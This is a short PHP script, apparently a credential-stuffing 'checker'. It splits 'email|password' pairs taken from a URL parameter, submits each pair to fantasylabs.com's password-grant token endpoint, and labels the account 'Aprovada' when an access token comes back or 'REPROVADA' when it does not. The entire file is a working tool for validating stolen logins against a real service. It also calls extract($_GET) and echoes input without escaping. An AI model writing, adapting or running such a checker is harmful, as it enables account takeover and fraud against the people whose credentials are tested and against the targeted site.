<?php 
error_reporting(0); 
 
extract($_GET); 
 
function getStr($string, $start, $end) 
{ 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
} 


function multiexplode($string) {
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
   }


   $lista = $_GET['lista'];
   $email = multiexplode($lista)[0];
   $senha = multiexplode($lista)[1];
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.fantasylabs.com/token/?afmc=');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "grant_type=password&username=".$email."&password=".$senha."");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

echo$result = curl_exec($ch);
if(strpos($result,'access_token')){
  echo "<div class='badge badge-success'>#Aprovada</div> <b class='badge badge-primary'>CONTA: $lista</b><span class='badge badge-primary'>@kozune</span></p>";
  }else{

echo "<div class='badge badge-danger'>#REPROVADA</div> <b class='badge badge-primary'>CONTA: $lista</b> 
<span class='badge badge-light'>@kozune</span></p>";
}
?>  